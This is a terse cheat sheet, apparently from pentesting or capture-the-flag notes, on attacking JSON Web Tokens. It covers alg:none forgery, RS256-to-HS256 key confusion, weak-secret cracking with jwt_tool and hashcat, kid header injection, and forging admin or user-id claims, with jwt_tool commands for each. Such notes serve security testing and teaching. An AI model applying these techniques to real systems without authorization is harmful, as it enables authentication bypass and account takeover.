## JWT attacks
Recognize: `eyJ...` base64url header.payload.signature. Decode header/payload (base64url).
alg:none -> set header `{"alg":"none"}`, drop the signature, forge claims. Try `none/None/NONE`.
alg confusion RS256->HS256 -> re-sign with the server's PUBLIC key as the HMAC secret (server verifies HS256 using the RSA public key it thinks is for RS256).
Weak secret -> crack: `jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt`, or hashcat mode 16500. Common: `secret`, `changeme`, `password`, app name, `supersecret`, `random`.
kid injection -> path traversal / SQLi in the `kid` header to control the key.
Claims to forge: `role":"admin"`, `isAdmin":true`, `sub`/`user_id` swap (IDOR-in-JWT), `exp` extend.
Tool: `jwt_tool TOKEN -X a` (alg none), `-X k -pk public.pem` (key confusion), `-C -d wordlist` (crack).
